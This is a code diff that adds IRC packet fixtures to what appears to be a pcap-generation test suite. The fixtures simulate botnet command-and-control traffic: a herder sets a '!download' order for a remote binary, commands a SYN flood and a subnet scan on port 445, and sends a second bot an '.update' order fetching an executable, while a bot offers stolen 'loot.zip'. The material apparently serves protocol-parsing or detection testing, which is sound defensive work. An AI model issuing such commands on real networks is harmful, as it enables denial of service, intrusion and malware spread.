@@ -2850,3 +2850,75 @@ def zabbix_packets():
 
 def write_zabbix_pcap(path):
     write_pcap(path, zabbix_packets())
+
+
+# ---------------------------------------------------------------- IRC
+#
+# Shaped on a capture of ngIRCd 27. IRC_SERVER (6667) asks for a server
+# password: CLIENT:43400 gives the wrong one and is closed. IRC_HERDER:43401
+# registers as herder, joins #ddos, keys it (s3cr3tkey), sets its topic to
+# a download order, orders a SYN flood and a scan, asks the bot's VERSION
+# and fails an OPER. CLIENT:43402, the bot, finds herder taken (433), takes
+# USA|83621, is refused a wrong key (475), joins with the right one - the
+# topic, the herder's orders and its own flood report - answers VERSION as
+# mIRC, offers loot.zip by DCC, identifies to NickServ (botpass) and quits.
+# CLIENT:43403 is another bot on IRC_ALT_SERVER's port 6669, whose welcome
+# arrives split across two segments: [DEU|W10]48213, told .update by a
+# private message.
+
+IRC_SERVER = '198.51.100.106'
+IRC_HERDER = '198.51.100.107'
+IRC_ALT_SERVER = '198.51.100.108'
+
+
+def _irc(*lines):
+    return b''.join(line.encode() + b'\r\n' for line in lines)
+
+
+def irc_packets():
+    host = 'irc.evilnet.example'
+    welcome = lambda nick: _irc(f':{host} 001 {nick} :Welcome to the Internet Relay Network {nick}',
+                                f':{host} 004 {nick} {host} ngircd-27 abBcCFiIoqrRswx abehiIklmMnoOPqQrRstvVz',
+                                f':{host} 005 {nick} RFC2812 IRCD=ngIRCd NETWORK=EvilNet CHANTYPES=#&+ :are supported')
+    bot = 'USA|83621'
+    topic = '!download http://198.51.100.66/bins/x86 /tmp/.x'
+    failed = [(True, _irc('PASS wrongpw', 'NICK lurker', 'USER lurker 0 * :Lurker')),
+              (False, _irc('ERROR :Closing connection: lurker[~lurker@10.1.0.10] (Access denied: Bad password?)'))]
+    herder = [(True, _irc('PASS ircPass1', 'NICK herder', 'USER herder 0 * :Bot Herder')), (False, welcome('herder')),
+              (True, _irc('JOIN #ddos')), (False, _irc(':herder!~herder@198.51.100.107 JOIN :#ddos')),
+              (True, _irc('MODE #ddos +k s3cr3tkey', f'TOPIC #ddos :{topic}')),
+              (False, _irc(f':herder!~herder@198.51.100.107 TOPIC #ddos :{topic}')),
+              (True, _irc('PRIVMSG #ddos :!ddos.syn 203.0.113.50 80 120')),
+              (False, _irc(f':{bot}!~x00x@10.1.0.10 PRIVMSG #ddos :[DDoS]: Flooding 203.0.113.50:80 for 120 seconds.')),
+              (True, _irc(f'PRIVMSG {bot} :\x01VERSION\x01')),
+              (False, _irc(f':{bot}!~x00x@10.1.0.10 NOTICE herder :\x01VERSION mIRC v6.17 Khaled Mardam-Bey\x01')),
+              (True, _irc('PRIVMSG #ddos :.scan 445 10.0.0.0/8')),
+              (False, _irc(f':{bot}!~x00x@10.1.0.10 PRIVMSG herder :\x01DCC SEND loot.zip 3325256770 5050 48213\x01')),
+              (True, _irc('OPER admin wrongoper')), (False, _irc(f':{host} 464 herder :Invalid password')),
+              (True, _irc('QUIT :done'))]
+    bot_side = [(True, _irc('PASS ircPass1', 'NICK herder')), (False, _irc(f':{host} 433 * herder :Nickname already in use')),
+                (True, _irc(f'NICK {bot}', 'USER x00x 0 * :x')), (False, welcome(bot)),
+                (True, _irc('JOIN #ddos wrongkey')),
+                (False, _irc(f':{host} 475 {bot} #ddos :Cannot join channel (+k) -- Wrong channel key')),
+                (True, _irc('JOIN #ddos s3cr3tkey')),
+                (False, _irc(f':{bot}!~x00x@10.1.0.10 JOIN :#ddos', f':{host} 332 {bot} #ddos :{topic}',
+                             f':{host} 353 {bot} = #ddos :{bot} @herder')),
+                (False, _irc(':herder!~herder@198.51.100.107 PRIVMSG #ddos :!ddos.syn 203.0.113.50 80 120')),
+                (True, _irc('PRIVMSG #ddos :[DDoS]: Flooding 203.0.113.50:80 for 120 seconds.')),
+                (False, _irc(f':herder!~herder@198.51.100.107 PRIVMSG {bot} :\x01VERSION\x01')),
+                (True, _irc('NOTICE herder :\x01VERSION mIRC v6.17 Khaled Mardam-Bey\x01')),
+                (False, _irc(':herder!~herder@198.51.100.107 PRIVMSG #ddos :.scan 445 10.0.0.0/8')),
+                (True, _irc('PRIVMSG herder :\x01DCC SEND loot.zip 3325256770 5050 48213\x01')),
+                (True, _irc('PRIVMSG NickServ :IDENTIFY botpass')), (True, _irc('QUIT :bye')),
+                (False, _irc(f'ERROR :Closing connection: {bot}[~x00x@10.1.0.10] ("bye")'))]
+    other = '[DEU|W10]48213'
+    alt_welcome = welcome(other).replace(host.encode(), b'irc.alt.example')
+    alt = [(True, _irc(f'NICK {other}', 'USER w10 0 * :w10')), (False, alt_welcome[:30]), (False, alt_welcome[30:]),
+           (False, _irc(f':boss!~boss@203.0.113.9 PRIVMSG {other} :.update http://203.0.113.9/w.exe'))]
+    return (tcp_segments(CLIENT, IRC_SERVER, 43400, 6667, failed) + tcp_segments(IRC_HERDER, IRC_SERVER, 43401, 6667, herder)
+            + tcp_segments(CLIENT, IRC_SERVER, 43402, 6667, bot_side)
+            + tcp_segments(CLIENT, IRC_ALT_SERVER, 43403, 6669, alt))
+
+
+def write_irc_pcap(path):
+    write_pcap(path, irc_packets())
